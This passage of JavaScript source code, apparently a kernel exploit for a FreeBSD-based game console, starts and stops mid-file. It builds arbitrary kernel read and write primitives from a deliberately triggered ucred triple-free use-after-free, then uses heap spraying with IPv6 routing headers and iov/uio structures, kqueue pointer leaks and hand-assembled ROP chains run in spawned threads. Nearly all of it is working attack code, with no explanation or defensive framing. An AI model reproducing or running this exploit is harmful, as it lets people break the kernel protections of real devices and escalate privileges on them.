    corruptPipebuf(0, 0, 0, PAGE_SIZE, dest);
    return write(victimWpipeFd, src, n);
}

function kread(dest, src, n) {
    corruptPipebuf(n, 0, 0, PAGE_SIZE, src);
    // Debug
    read(victimRpipeFd, dest, n);
    for (i=0; i<n; i=i+8) {
        debug("kread_read: " + hex(read64(dest.add(i))) );
    }
    return
}

function kwrite64(addr, val) {
    write64(tmp, val);
    kwrite(addr, tmp, 8);
}

function kwrite32(addr, val) {
    write32(tmp, val);
    kwrite(addr, tmp, 4);
}

function kread64(addr) {
    kread(tmp, addr, 8);
    return read64(tmp);
}

function kread32(addr) {
    kread(tmp, addr, 4);
    return read32(tmp);
}

function removeUafFile() {
    uafFile = fget(uaf_socket);
    kwrite64(fdt_ofiles.add(uaf_socket * FILEDESCENT_SIZE), 0);
    removed = 0;
    for (i = 0; i < UAF_TRIES; i++) {
        s = socket(AF_UNIX, SOCK_STREAM, 0);
        if (fget(s).eq(uafFile)) {
            kwrite64(fdt_ofiles.add(s * FILEDESCENT_SIZE), 0);
            removed++;
        }
        close(s);
        if (removed == 3) {
            break;
        }
    }
}


function trigger_ucred_triplefree() {
    var end = false;
    var set_buf = malloc(8);
    var clear_buf = malloc(8);

    write64(msgIov.add(0x0), 1); // iov_base
    write64(msgIov.add(0x8), 1); // iov_len

    do {
        //debug('    Memory: avail=' + debugging.info.memory.available + ' dmem=' + debugging.info.memory.available_dmem + ' libc=' + debugging.info.memory.available_libc);
        var dummy_socket = socket(AF_UNIX, SOCK_STREAM, 0);

        // Register dummy socket.
        write32(set_buf, dummy_socket&0xFFFFFFFF);
        netcontrol(BigInt_Error, NET_CONTROL_NETEVENT_SET_QUEUE, set_buf, 8);

        // Close the dummy socket.
        close(dummy_socket);

        // Allocate a new ucred.
        setuid(1);

        // Reclaim the file descriptor.
        uaf_socket = socket(AF_UNIX, SOCK_STREAM, 0);

        // Free the previous ucred. Now uafSock's cr_refcnt of f_cred is 1.
        setuid(1);

        // Unregister dummy socket and free the file and ucred.
        write32(clear_buf, uaf_socket);
        netcontrol(BigInt_Error, NET_CONTROL_NETEVENT_CLEAR_QUEUE, clear_buf, 8);

        // Set cr_refcnt back to 1.
        for (var i = 0; i < 32; i++) {
            // Reclaim with iov.
            trigger_iov_recvmsg();
            sched_yield();
            // Release buffers.
            write(iov_sock_1, tmp, 1);
            wait_iov_recvmsg();
            read(iov_sock_0, tmp, 1);
        }

        // Double free ucred.
        // Note: Only dup works because it does not check f_hold.
        close(dup(uaf_socket));

        debug("Finding Twins...");
        // Find twins.
        end = find_twins();

        //end = find_twins_rop();

        if(!end) {
            // Clean up and start again
            close(uaf_socket);
            continue;
        }

        // Let's make sure that they are indeed twins
        // var leak_0 = malloc(8);
        // var leak_1 = malloc(8);

        // get_rthdr(ipv6_socks[twins[0]], leak_0, 8);
        // get_rthdr(ipv6_socks[twins[1]], leak_1, 8);
        
        // debug("These are twins values: " + hex(read64(leak_0)) + " " + hex(read64(leak_1)) );


        debug("Triple freeing...");

        // Free one.
        free_rthdr(ipv6_socks[twins[1]]);

        var count = 0;

        // Set cr_refcnt back to 1.
        while (count < 10000) {
            // Reclaim with iov.
            trigger_iov_recvmsg();
            sched_yield();

            get_rthdr(ipv6_socks[twins[0]], leak_rthdr, 8);

            if (read32(leak_rthdr) == 1) {
                break;
            }

            // Release iov spray.
            write(iov_sock_1, tmp, 1);
            wait_iov_recvmsg();
            read(iov_sock_0, tmp, 1);
            count++;
        }

        if (count === 10000) {
            debug("Dropped out from loop");
            // Clean up and start again
            close(uaf_socket);
            continue;

        }

        triplets[0] = twins[0];

        // Triple free ucred.
        close(dup(uaf_socket));

        // Find triplet.
        triplets[1] = find_triplet(triplets[0], -1);

        // If error start again to better exploit possibility
        if (triplets[1] === -1) {
            debug("Couldn't find triplet 1");
            // Clean up and start again
            // Release iov spray.
            // if we break on 'read32(leak_rthdr) == 1', we never released workers
            write(iov_sock_1, tmp, 1);
            close(uaf_socket);
            // Start again
            end = false;
            continue;    
        }


        // Release iov spray.
        // if we break on 'read32(leak_rthdr) == 1', we never released workers
        write(iov_sock_1, tmp, 1);

        // Find triplet.
        triplets[2] = find_triplet(triplets[0], triplets[1]);

        // If error start again to better exploit possibility
        if (triplets[2] === -1) {
            debug("Couldn't find triplet 2");
            // Clean up and start again
            close(uaf_socket);
            // Start again
            end = false;
            continue;    
        }

        // Let's make sure that they are indeed triplets
        // var leak_0 = malloc(8);
        // var leak_1 = malloc(8);
        // var leak_2 = malloc(8);

        // get_rthdr(ipv6_socks[triplets[0]], leak_0, 8);
        // get_rthdr(ipv6_socks[triplets[1]], leak_1, 8);
        // get_rthdr(ipv6_socks[triplets[2]], leak_2, 8);
        
        // debug("These are triplets values: " + hex(read64(leak_0)) + " " + hex(read64(leak_1)) + " " + hex(read64(leak_2)) );

        // Wait iov release completition
        wait_iov_recvmsg();
        read(iov_sock_0, tmp, 1);
    } while(!end)

}

function leak_kqueue() {
    //debug('    Memory: avail=' + debugging.info.memory.available + ' dmem=' + debugging.info.memory.available_dmem + ' libc=' + debugging.info.memory.available_libc);
    debug("Leaking kqueue...");

    // Free one. From this point we are going to use only twins
    free_rthdr(ipv6_socks[triplets[2]]);

    // Leak kqueue.
    var kq = 0;

    // Minimizing footprint
    var magic_val = new BigInt(0x0, 0x1430000);
    var magic_add = leak_rthdr.add(0x08);

    while (true) {
        kq = kqueue();

        // Leak with other rthdr.
        get_rthdr(ipv6_socks[triplets[0]], leak_rthdr, 0x100);

        if (read64(magic_add).eq(magic_val) && !read64(leak_rthdr.add(0x98)).eq(0)) {
            break;
        }

        close(kq);
    }

    // kq_fdp = read64(leak_rthdr.add(0xA8)); // PS5 offset

    kq_lock = read64(leak_rthdr.add(0x60));
    kq_fdp = read64(leak_rthdr.add(0x98));

    if (kq_fdp.eq(0)) {
        debug("Failed to leak kqueue_fdp");
        return false;
    }

    debug("kq_fdp: " + hex(kq_fdp) + " kq_lock: " + hex(kq_lock));

    // for (i=0; i<0x100; i=i+8) {
    //     debug("leak_rthdr.add(" + i + ") : " + hex(read64(leak_rthdr.add(i))));
    // }

    // Close kqueue to free buffer.
    close(kq);

    // Find triplet.
    // No need we discarded triplets[2] and we only use twins from now on
    //triplets[1] = find_triplet(triplets[0], -1);

    return true;

}

function kreadslow64(address) {
    var buffer = kreadslow(address, 8);
    //debug("Buffer from kreadslow: " + hex(buffer));
    return read64(buffer);
}

function build_uio(uio, uio_iov, uio_td, read, addr, size) {
    write64(uio.add(0x00), uio_iov);        // uio_iov
    write64(uio.add(0x08), UIO_IOV_NUM);    // uio_iovcnt
    write64(uio.add(0x10), BigInt_Error);   // uio_offset
    write64(uio.add(0x18), size);           // uio_resid
    write32(uio.add(0x20), UIO_SYSSPACE);   // uio_segflg
    write32(uio.add(0x24), read ? UIO_WRITE : UIO_READ); // uio_segflg
    write64(uio.add(0x28), uio_td);         // uio_td
    write64(uio.add(0x30), addr);           // iov_base
    write64(uio.add(0x38), size);           // iov_len
  }

function kreadslow(addr, size) {
    //debug('    Memory: avail=' + debugging.info.memory.available + ' dmem=' + debugging.info.memory.available_dmem + ' libc=' + debugging.info.memory.available_libc);
    debug("Enter kreadslow addr: " + hex(addr) + " size : " + size);

    // Prepare leak buffers.
    var leak_buffers = new Array(UIO_THREAD_NUM);
    for (var i=0; i<UIO_THREAD_NUM ; i++) {
        leak_buffers[i] = malloc(size);
    }

    // Set send buf size.
    var buf_size = malloc(4);
    write32(buf_size, size);
    setsockopt(uio_sock_1, SOL_SOCKET, SO_SNDBUF, buf_size, 4);

    // Fill queue.
    write(uio_sock_1, tmp, size);

    // Set iov length
    write64(uioIovRead.add(0x08), size);

    // Free one.
    free_rthdr(ipv6_socks[triplets[1]]);

    // Minimize footprint
    var uio_leak_add = leak_rthdr.add(0x08);

    // Reclaim with uio.
    while (true) {
        trigger_uio_writev(); // COMMAND_UIO_READ in fl0w's
        sched_yield();

        // Leak with other rthdr.
        get_rthdr(ipv6_socks[triplets[0]], leak_rthdr, 0x10);

        if (read32(uio_leak_add) === UIO_IOV_NUM) {
            //debug("Break on reclaim with uio");
            break;
        }

        // Wake up all threads.
        read(uio_sock_0, tmp, size);

        for (i=0; i<UIO_THREAD_NUM; i++) {
            read(uio_sock_0, leak_buffers[i], size);
        }
        
        wait_uio_writev();

        // Fill queue.
        write(uio_sock_1, tmp, size);
    }

    var uio_iov = read64(leak_rthdr);
    debug("This is uio_iov: " + hex(uio_iov));

    // Prepare uio reclaim buffer.
    build_uio(msgIov, uio_iov, 0, true, addr, size);

    // Find new one to free
    triplets[1] = find_triplet(triplets[0], -1, 1000);

    // Free second one.
    free_rthdr(ipv6_socks[triplets[1]]);

    // Minimize footprint
    var iov_leak_add = leak_rthdr.add(0x20);

    // Reclaim uio with iov.
    while (true) {
        // Reclaim with iov.
        trigger_iov_recvmsg();
        sched_yield();

        // Leak with other rthdr.
        get_rthdr(ipv6_socks[triplets[0]], leak_rthdr, 0x40);

        if (read32(iov_leak_add) === UIO_SYSSPACE) {
            //debug("Break on reclaim uio with iov");
            break;
        }

        // Release iov spray.
        write(iov_sock_1, tmp, 1);
        wait_iov_recvmsg();
        read(iov_sock_0, tmp, 1);
    }

    // Wake up all threads.
    read(uio_sock_0, tmp, size);

    // Read the results now.
    var leak_buffer;

    var tag_val = new BigInt(0x41414141, 0x41414141);

    // Get leak.
    //debug("Before getting leak");
    for (var i = 0; i < UIO_THREAD_NUM; i++) {
        read(uio_sock_0, leak_buffers[i], size);
        var val = read64(leak_buffers[i]);
        //debug("I read from leak_buffers[" + i + "] : " + hex(val) );
        if (!val.eq(tag_val)) {
            // Find triplet.
            triplets[1] = find_triplet(triplets[0], -1, 1000);
            leak_buffer = leak_buffers[i].add(0);
            //debug("This is leak_buffer " + hex(leak_buffer) + " - " + hex(read64(leak_buffer)));
        }
    }
   // debug("After getting leak");
    // Workers should have finished earlier no need to wait
    wait_uio_writev();

    // Release iov spray.
    write(iov_sock_1, tmp, 1);

    // Find triplet.
    //triplets[2] = find_triplet(triplets[0], triplets[1], 500);

    // Let's make sure that they are indeed triplets
    // var leak_0 = malloc(8);
    // var leak_1 = malloc(8);
    // var leak_2 = malloc(8);

    // get_rthdr(ipv6_socks[triplets[0]], leak_0, 8);
    // get_rthdr(ipv6_socks[triplets[1]], leak_1, 8);
    // get_rthdr(ipv6_socks[triplets[2]], leak_2, 8);
    
    // debug("This are triplets values: " + hex(read64(leak_0)) + " " + hex(read64(leak_1)) + " " + hex(read64(leak_2)) );


    // Workers should have finished earlier no need to wait
    wait_iov_recvmsg();
    read(iov_sock_0, tmp, 1);

    return leak_buffer;

}

function kwriteslow(addr, buffer, size) {
    //debug('    Memory: avail=' + debugging.info.memory.available + ' dmem=' + debugging.info.memory.available_dmem + ' libc=' + debugging.info.memory.available_libc);
    debug("Enter kwriteslow addr: " + hex(addr) + " buffer: " + hex(buffer) + " size : " + size);

    // Set send buf size.
    var buf_size = malloc(4);
    write32(buf_size, size);
    setsockopt(uio_sock_1, SOL_SOCKET, SO_SNDBUF, buf_size, 4);

    // Set iov length.
    write64(uioIovWrite.add(0x08), size);

    // Free first triplet.
    free_rthdr(ipv6_socks[triplets[1]]);

    // Minimize footprint
    var uio_leak_add = leak_rthdr.add(0x08);

    // Reclaim with uio.
    while (true) {
        trigger_uio_readv(); // COMMAND_UIO_WRITE in fl0w's
        sched_yield();

        // Leak with other rthdr.
        get_rthdr(ipv6_socks[triplets[0]], leak_rthdr, 0x10);

        if (read32(uio_leak_add) === UIO_IOV_NUM) {
            debug("Break on reclaim with uio");
            break;
        }

        // Wake up all threads.
        for (i=0; i<UIO_THREAD_NUM; i++) {
            write(uio_sock_1, buffer, size);
        }

        wait_uio_readv();
    }

    var uio_iov = read64(leak_rthdr);
    debug("This is uio_iov: " + hex(uio_iov));

    // Prepare uio reclaim buffer.
    build_uio(msgIov, uio_iov, 0, false, addr, size);

    // Find new one to free
    triplets[1] = find_triplet(triplets[0], -1, 1000);

    // Free second one.
    free_rthdr(ipv6_socks[triplets[1]]);

    // Minimize footprint
    var iov_leak_add = leak_rthdr.add(0x20);

    // Reclaim uio with iov.
    while (true) {
        // Reclaim with iov.
        trigger_iov_recvmsg();
        sched_yield();

        // Leak with other rthdr.
        get_rthdr(ipv6_socks[triplets[0]], leak_rthdr, 0x40);

        if (read32(iov_leak_add) === UIO_SYSSPACE) {
            debug("Break on reclaim uio with iov");
            break;
        }

        // Release iov spray.
        write(iov_sock_1, tmp, 1);
        wait_iov_recvmsg();
        read(iov_sock_0, tmp, 1);
    }

    // Corrupt data.
    for (i=0; i<UIO_THREAD_NUM; i++) {
        write(uio_sock_1, buffer, size);
    }

    // Find triplet.
    triplets[1] = find_triplet(triplets[0], -1, 1000);

    // Workers should have finished earlier no need to wait
    wait_uio_writev();

    // Release iov spray.
    write(iov_sock_1, tmp, 1);

    // Find triplet.
    //triplets[2] = find_triplet(triplets[0], triplets[1], 500);

    // Workers should have finished earlier no need to wait
    wait_iov_recvmsg();
    read(iov_sock_0, tmp, 1);
}

function rop_regen_and_loop(last_rop_entry, number_entries) {

    var new_rop_entry = last_rop_entry.add(8);
    var copy_entry = last_rop_entry.sub(number_entries*8).add(8);   // We add 8 to have the first ROP instruction add
    var rop_loop = last_rop_entry.sub(number_entries*8).add(8);     // We add 8 to have the first ROP instruction add

    for(var i = 0; i < number_entries; i++){       

        var entry_add = copy_entry;
        var entry_val = read64(copy_entry);

        write64(new_rop_entry.add(0x0),  gadgets.POP_RDI_RET);
        write64(new_rop_entry.add(0x8),  entry_add);
        write64(new_rop_entry.add(0x10), gadgets.POP_RAX_RET);
        write64(new_rop_entry.add(0x18), entry_val);
        write64(new_rop_entry.add(0x20), gadgets.MOV_QWORD_PTR_RDI_RAX_RET);

        copy_entry = copy_entry.add(8);
        new_rop_entry = new_rop_entry.add(0x28);
    }

    // Time to jump back
    write64(new_rop_entry.add(0x0),  gadgets.POP_RSP_RET);
    write64(new_rop_entry.add(0x8),  rop_loop);
}

function spawn_thread(rop_array, loop_entries, stack) {
    
    var rop_addr = stack !== undefined ? stack : malloc(0x600);

    //const rop_addr = malloc(size); // ROP Stack plus extra size

    // Fill ROP Stack
    for(var i=0 ; i < rop_array.length ; i++) {
        write64(rop_addr.add(i*8), rop_array[i]);
        //debug("This is what I wrote: " + hex(read64(rop_race1_addr.add(i*8))));
    }

    // if loop_entries <> 0 we need to prepare the ROP to regenerate itself and jump back
    // loop_entries indicates the number of stack entries we need to regenerate
    if (loop_entries !== 0) {
        var last_rop_entry = rop_addr.add(rop_array.length * 8).sub(8); // We pass the add of the last ROP instruction
        rop_regen_and_loop(last_rop_entry, loop_entries);
        // now our rop size is rop_array.length + loop_entries * (0x28) {copy primitive} + 0x10 {stack pivot}
    }

    const jmpbuf = malloc(0x60);

    // FreeBSD amd64 jmp_buf layout:
    // 0x00: RIP, 0x08: RBX, 0x10: RSP, 0x18: RBP, 0x20-0x38: R12-R15, 0x40: FPU, 0x44: MXCSR
    write64(jmpbuf.add(0x00), gadgets.RET);         // RIP - ret gadget
    write64(jmpbuf.add(0x10), rop_addr);      // RSP - pivot to ROP chain
    write32(jmpbuf.add(0x40), new BigInt(saved_fpu_ctrl)); // FPU control
    write32(jmpbuf.add(0x44), new BigInt(saved_mxcsr));    // MXCSR

    const stack_size = new BigInt(0x100);
    const tls_size = new BigInt(0x40);

    const thr_new_args  = malloc(0x80);
    const tid_addr      = malloc(0x8);
    const cpid          = malloc(0x8);
    const stack         = malloc(Number(stack_size));
    const tls           = malloc(Number(tls_size));

    write64(thr_new_args.add(0x00), longjmp_addr);       // start_func = longjmp
    write64(thr_new_args.add(0x08), jmpbuf);             // arg = jmpbuf
    write64(thr_new_args.add(0x10), stack);              // stack_base
    write64(thr_new_args.add(0x18), stack_size);         // stack_size
    write64(thr_new_args.add(0x20), tls);                // tls_base
    write64(thr_new_args.add(0x28), tls_size);           // tls_size
    write64(thr_new_args.add(0x30), tid_addr);           // child_tid (output)
    write64(thr_new_args.add(0x38), cpid);               // parent_tid (output)

    const result = thr_new(thr_new_args, 0x68);
    //debug("thr_new result: " + hex(result));
    if (!result.eq(0)) {
        throw new Error("thr_new failed: " + hex(result));
    }
    return read64(tid_addr);
}

function iov_recvmsg_worker_rop (ready_signal, run_fd, done_signal, signal_buf) {
    var rop = [];

    rop.push(0); // first element overwritten by longjmp, skip it

    const cpu_mask = malloc(0x10);
    write16(cpu_mask, 1 << MAIN_CORE);

    // Pin to core - cpuset_setaffinity(CPU_LEVEL_WHICH, CPU_WHICH_TID, -1, 0x10, mask)
    rop.push(gadgets.POP_RDI_RET);
    rop.push(3);                        // CPU_LEVEL_WHICH
    rop.push(gadgets.POP_RSI_RET);
    rop.push(1);                        // CPU_WHICH_TID
    rop.push(gadgets.POP_RDX_RET);
    rop.push(BigInt_Error);   // id = -1 (current thread)
    rop.push(gadgets.POP_RCX_RET);
    rop.push(0x10);                     // setsize
    rop.push(gadgets.POP_R8_RET);
    rop.push(cpu_mask);
    rop.push(cpuset_setaffinity_wrapper);

    const rtprio_buf = malloc(4);
    write16(rtprio_buf, PRI_REALTIME);
    write16(rtprio_buf.add(2), MAIN_RTPRIO);

    // Set priority - rtprio_thread(RTP_SET, 0, rtprio_buf)
    rop.push(gadgets.POP_RDI_RET);
    rop.push(1);         // RTP_SET
    rop.push(gadgets.POP_RSI_RET); 
    rop.push(0);         // lwpid = 0 (current thread)
    rop.push(gadgets.POP_RDX_RET);
    rop.push(rtprio_buf);
    rop.push(rtprio_thread_wrapper);

    // Signal ready - write 1 to ready_signal
    rop.push(gadgets.POP_RDI_RET);
    rop.push(ready_signal);
    rop.push(gadgets.POP_RAX_RET);
    rop.push(1);
    rop.push(gadgets.MOV_QWORD_PTR_RDI_RAX_RET);

    var loop_init = rop.length;

    // Read from pipe (blocks here) - read(run_fd, pipe_buf, 1)
    rop.push(gadgets.POP_RDI_RET);
    rop.push(run_fd);
    rop.push(gadgets.POP_RSI_RET);
    rop.push(signal_buf);
    rop.push(gadgets.POP_RDX_RET);
    rop.push(1);
    rop.push(read_wrapper);

    // recvmsg(iov_sock_0, msg, 0)
    rop.push(gadgets.POP_RDI_RET);
    rop.push(iov_sock_0);
    rop.push(gadgets.POP_RSI_RET);
    rop.push(msg);
    rop.push(gadgets.POP_RDX_RET);
    rop.push(0);
    rop.push(recvmsg_wrapper);

    // Signal done - write 1 to deletion_signal
    rop.push(gadgets.POP_RDI_RET); // pop rdi ; ret
    rop.push(done_signal);
    rop.push(gadgets.POP_RAX_RET);
    rop.push(1);
    rop.push(gadgets.MOV_QWORD_PTR_RDI_RAX_RET);

    var loop_end = rop.length;
    var loop_size = loop_end - loop_init;
    // It's gonna loop

    return {
        rop: rop,
        loop_size: loop_size
    };

}

function uio_readv_worker_rop (ready_signal, run_fd, done_signal, signal_buf) {
    var rop = [];

    rop.push(0); // first element overwritten by longjmp, skip it

    const cpu_mask = malloc(0x10);
    write16(cpu_mask, 1 << MAIN_CORE);

    // Pin to core - cpuset_setaffinity(CPU_LEVEL_WHICH, CPU_WHICH_TID, -1, 0x10, mask)
    rop.push(gadgets.POP_RDI_RET);
    rop.push(3);                        // CPU_LEVEL_WHICH
    rop.push(gadgets.POP_RSI_RET);
    rop.push(1);                        // CPU_WHICH_TID
    rop.push(gadgets.POP_RDX_RET);
    rop.push(BigInt_Error);   // id = -1 (current thread)
    rop.push(gadgets.POP_RCX_RET);
    rop.push(0x10);                     // setsize
    rop.push(gadgets.POP_R8_RET);
    rop.push(cpu_mask);
    rop.push(cpuset_setaffinity_wrapper);

    const rtprio_buf = malloc(4);
    write16(rtprio_buf, PRI_REALTIME);
    write16(rtprio_buf.add(2), MAIN_RTPRIO);

    // Set priority - rtprio_thread(RTP_SET, 0, rtprio_buf)
    rop.push(gadgets.POP_RDI_RET);
    rop.push(1);         // RTP_SET
    rop.push(gadgets.POP_RSI_RET); 
    rop.push(0);         // lwpid = 0 (current thread)
    rop.push(gadgets.POP_RDX_RET);
    rop.push(rtprio_buf);
    rop.push(rtprio_thread_wrapper);

    // Signal ready - write 1 to ready_signal
    rop.push(gadgets.POP_RDI_RET);
    rop.push(ready_signal);
    rop.push(gadgets.POP_RAX_RET);
    rop.push(1);
    rop.push(gadgets.MOV_QWORD_PTR_RDI_RAX_RET);

    var loop_init = rop.length;

    // Read from pipe (blocks here) - read(run_fd, pipe_buf, 1)
    rop.push(gadgets.POP_RDI_RET);
    rop.push(run_fd);
    rop.push(gadgets.POP_RSI_RET);
    rop.push(signal_buf);
    rop.push(gadgets.POP_RDX_RET);
    rop.push(1);
    rop.push(read_wrapper);

    // readv(uio_sock_0, uioIovWrite, UIO_IOV_NUM);
    rop.push(gadgets.POP_RDI_RET);
    rop.push(uio_sock_0);
    rop.push(gadgets.POP_RSI_RET);
    rop.push(uioIovWrite);
    rop.push(gadgets.POP_RDX_RET);
    rop.push(UIO_IOV_NUM);
    rop.push(readv_wrapper);

    // Signal done - write 1 to deletion_signal
    rop.push(gadgets.POP_RDI_RET); // pop rdi ; ret
    rop.push(done_signal);
    rop.push(gadgets.POP_RAX_RET);
    rop.push(1);
    rop.push(gadgets.MOV_QWORD_PTR_RDI_RAX_RET);

    var loop_end = rop.length;
    var loop_size = loop_end - loop_init;
    // It's gonna loop

    return {
        rop: rop,
        loop_size: loop_size
    };

}

function uio_writev_worker_rop (ready_signal, run_fd, done_signal, signal_buf) {
    var rop = [];

    rop.push(0); // first element overwritten by longjmp, skip it

    const cpu_mask = malloc(0x10);
    write16(cpu_mask, 1 << MAIN_CORE);

    // Pin to core - cpuset_setaffinity(CPU_LEVEL_WHICH, CPU_WHICH_TID, -1, 0x10, mask)
    rop.push(gadgets.POP_RDI_RET);
    rop.push(3);                        // CPU_LEVEL_WHICH
    rop.push(gadgets.POP_RSI_RET);
    rop.push(1);                        // CPU_WHICH_TID
    rop.push(gadgets.POP_RDX_RET);
    rop.push(BigInt_Error);   // id = -1 (current thread)
    rop.push(gadgets.POP_RCX_RET);
    rop.push(0x10);                     // setsize
    rop.push(gadgets.POP_R8_RET);
    rop.push(cpu_mask);
    rop.push(cpuset_setaffinity_wrapper);

    const rtprio_buf = malloc(4);
    write16(rtprio_buf, PRI_REALTIME);
    write16(rtprio_buf.add(2), MAIN_RTPRIO);

    // Set priority - rtprio_thread(RTP_SET, 0, rtprio_buf)
    rop.push(gadgets.POP_RDI_RET);
    rop.push(1);         // RTP_SET
    rop.push(gadgets.POP_RSI_RET); 
    rop.push(0);         // lwpid = 0 (current thread)
    rop.push(gadgets.POP_RDX_RET);
    rop.push(rtprio_buf);
    rop.push(rtprio_thread_wrapper);

    // Signal ready - write 1 to ready_signal
    rop.push(gadgets.POP_RDI_RET);
    rop.push(ready_signal);
    rop.push(gadgets.POP_RAX_RET);
    rop.push(1);
    rop.push(gadgets.MOV_QWORD_PTR_RDI_RAX_RET);

    var loop_init = rop.length;

    // Read from pipe (blocks here) - read(run_fd, pipe_buf, 1)
    rop.push(gadgets.POP_RDI_RET);
    rop.push(run_fd);
    rop.push(gadgets.POP_RSI_RET);
    rop.push(signal_buf);
    rop.push(gadgets.POP_RDX_RET);
    rop.push(1);
    rop.push(read_wrapper);

    // writev(uio_sock_1, uioIovRead, UIO_IOV_NUM);
    rop.push(gadgets.POP_RDI_RET);
    rop.push(uio_sock_1);
    rop.push(gadgets.POP_RSI_RET);
    rop.push(uioIovRead);
    rop.push(gadgets.POP_RDX_RET);
    rop.push(UIO_IOV_NUM);
    rop.push(writev_wrapper);

    // Signal done - write 1 to deletion_signal
    rop.push(gadgets.POP_RDI_RET); // pop rdi ; ret
    rop.push(done_signal);
    rop.push(gadgets.POP_RAX_RET);
    rop.push(1);
    rop.push(gadgets.MOV_QWORD_PTR_RDI_RAX_RET);

    var loop_end = rop.length;
    var loop_size = loop_end - loop_init;
    // It's gonna loop

    return {
        rop: rop,
        loop_size: loop_size
    };

}

function ipv6_sock_spray_and_read_rop (ready_signal, run_fd, done_signal, signal_buf) {
    var rop = [];

    rop.push(0); // first element overwritten by longjmp, skip it

    const cpu_mask = malloc(0x10);
    write16(cpu_mask, 1 << MAIN_CORE);

    // Pin to core - cpuset_setaffinity(CPU_LEVEL_WHICH, CPU_WHICH_TID, -1, 0x10, mask)
    rop.push(gadgets.POP_RDI_RET);
    rop.push(3);                        // CPU_LEVEL_WHICH
    rop.push(gadgets.POP_RSI_RET);
    rop.push(1);                        // CPU_WHICH_TID
    rop.push(gadgets.POP_RDX_RET);
    rop.push(BigInt_Error);   // id = -1 (current thread)
    rop.push(gadgets.POP_RCX_RET);
    rop.push(0x10);                     // setsize
    rop.push(gadgets.POP_R8_RET);
    rop.push(cpu_mask);
    rop.push(cpuset_setaffinity_wrapper);

    const rtprio_buf = malloc(4);
    write16(rtprio_buf, PRI_REALTIME);
    write16(rtprio_buf.add(2), MAIN_RTPRIO);

    // Set priority - rtprio_thread(RTP_SET, 0, rtprio_buf)
    rop.push(gadgets.POP_RDI_RET);
    rop.push(1);         // RTP_SET
    rop.push(gadgets.POP_RSI_RET); 
    rop.push(0);         // lwpid = 0 (current thread)
    rop.push(gadgets.POP_RDX_RET);
    rop.push(rtprio_buf);
    rop.push(rtprio_thread_wrapper);

    // Signal ready - write 1 to ready_signal
    rop.push(gadgets.POP_RDI_RET);
    rop.push(ready_signal);
    rop.push(gadgets.POP_RAX_RET);
    rop.push(1);
    rop.push(gadgets.MOV_QWORD_PTR_RDI_RAX_RET);

    var loop_init = rop.length;

    // Read from pipe (blocks here) - read(run_fd, pipe_buf, 1)
    rop.push(gadgets.POP_RDI_RET);
    rop.push(run_fd);
    rop.push(gadgets.POP_RSI_RET);
    rop.push(signal_buf);
    rop.push(gadgets.POP_RDX_RET);
    rop.push(1);
    rop.push(read_wrapper);

    // Spray all sockets
    for (var i = 0; i < ipv6_socks.length; i++) {
        rop.push(gadgets.POP_RDI_RET);
        rop.push(ipv6_socks[i]);
        rop.push(gadgets.POP_RSI_RET);
        rop.push(IPPROTO_IPV6);
        rop.push(gadgets.POP_RDX_RET);
        rop.push(IPV6_RTHDR);
        rop.push(gadgets.POP_RCX_RET);
        rop.push(spray_rthdr_rop.add(i*UCRED_SIZE)) // Offset for socket i

        //debug("");
        //debug("Using this buffer " + hex(spray_rthdr_rop.add(i*UCRED_SIZE)) + " : " + hex(read64(spray_rthdr_rop.add(i*UCRED_SIZE))));

        rop.push(gadgets.POP_R8_RET);
        rop.push(spray_rthdr_len);
        rop.push(setsockopt_wrapper);
    }

    // After spraying, read all sockets into buffer array
    for (var i = 0; i < ipv6_socks.length; i++) {
        rop.push(gadgets.POP_RDI_RET);
        rop.push(ipv6_socks[i]);
        //debug("");
        //debug("pushed sock: " + hex(ipv6_socks[i]));
        rop.push(gadgets.POP_RSI_RET);
        rop.push(IPPROTO_IPV6);
        rop.push(gadgets.POP_RDX_RET);
        rop.push(IPV6_RTHDR);
        rop.push(gadgets.POP_RCX_RET);
        rop.push(read_rthdr_rop.add(i * 8));  // Offset for socket i
        //debug("Pushing read from add " + hex(read_rthdr_rop.add(i * 8)));
        rop.push(gadgets.POP_R8_RET);
        rop.push(check_len);
        rop.push(getsockopt_wrapper);
    }

    // Signal done - write 1 to deletion_signal
    rop.push(gadgets.POP_RDI_RET); // pop rdi ; ret
    rop.push(done_signal);
    rop.push(gadgets.POP_RAX_RET);
    rop.push(1);
    rop.push(gadgets.MOV_QWORD_PTR_RDI_RAX_RET);

    // Exit
    rop.push(gadgets.POP_RDI_RET)
    rop.push(0)
    rop.push(thr_exit_wrapper)

    var loop_end = rop.length;
    var loop_size = loop_end - loop_init;

    // It's gonna loop

    return {
        rop: rop,
        loop_size: 0//loop_size
    }

}

function ipv6_sock_spray_and_read_triplet_rop (ready_signal, run_fd, done_signal, signal_buf, master, other) {
    var rop = [];

    rop.push(0); // first element overwritten by longjmp, skip it

    const cpu_mask = malloc(0x10);
    write16(cpu_mask, 1 << MAIN_CORE);

    // Pin to core - cpuset_setaffinity(CPU_LEVEL_WHICH, CPU_WHICH_TID, -1, 0x10, mask)
    rop.push(gadgets.POP_RDI_RET);
    rop.push(3);                        // CPU_LEVEL_WHICH
    rop.push(gadgets.POP_RSI_RET);
    rop.push(1);                        // CPU_WHICH_TID
    rop.push(gadgets.POP_RDX_RET);
    rop.push(BigInt_Error);   // id = -1 (current thread)
    rop.push(gadgets.POP_RCX_RET);
    rop.push(0x10);                     // setsize
    rop.push(gadgets.POP_R8_RET);
    rop.push(cpu_mask);
    rop.push(cpuset_setaffinity_wrapper);

    const rtprio_buf = malloc(4);
    write16(rtprio_buf, PRI_REALTIME);
    write16(rtprio_buf.add(2), MAIN_RTPRIO);

    // Set priority - rtprio_thread(RTP_SET, 0, rtprio_buf)
    rop.push(gadgets.POP_RDI_RET);
    rop.push(1);         // RTP_SET
    rop.push(gadgets.POP_RSI_RET); 
    rop.push(0);         // lwpid = 0 (current thread)
    rop.push(gadgets.POP_RDX_RET);
    rop.push(rtprio_buf);
    rop.push(rtprio_thread_wrapper);

    // Signal ready - write 1 to ready_signal
    rop.push(gadgets.POP_RDI_RET);
    rop.push(ready_signal);
    rop.push(gadgets.POP_RAX_RET);
    rop.push(1);
    rop.push(gadgets.MOV_QWORD_PTR_RDI_RAX_RET);

    var loop_init = rop.length;

    // Read from pipe (blocks here) - read(run_fd, pipe_buf, 1)
    rop.push(gadgets.POP_RDI_RET);
    rop.push(run_fd);
    rop.push(gadgets.POP_RSI_RET);
    rop.push(signal_buf);
    rop.push(gadgets.POP_RDX_RET);
    rop.push(1);
    rop.push(read_wrapper);

    // Spray all sockets
    for (var i = 0; i < ipv6_socks.length; i++) {

        // Don't spray on socket master or other
